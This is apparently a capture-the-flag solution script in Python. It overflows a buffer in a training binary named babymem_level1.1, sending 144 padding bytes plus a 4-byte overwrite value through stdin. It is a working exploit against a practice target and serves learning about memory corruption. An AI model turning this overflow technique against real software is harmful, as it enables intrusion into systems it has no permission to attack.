import sys
import subprocess

payload = b"A" * 144
payload += b"\x01\x00\x00\x00"

# Constructing the full input
full_input = str(len(payload)).encode() + b"\n" + payload

# Call the vulnerable program
p = subprocess.Popen(["/challenge/babymem_level1.1"], stdin=subprocess.PIPE)
p.communicate(input=full_input)

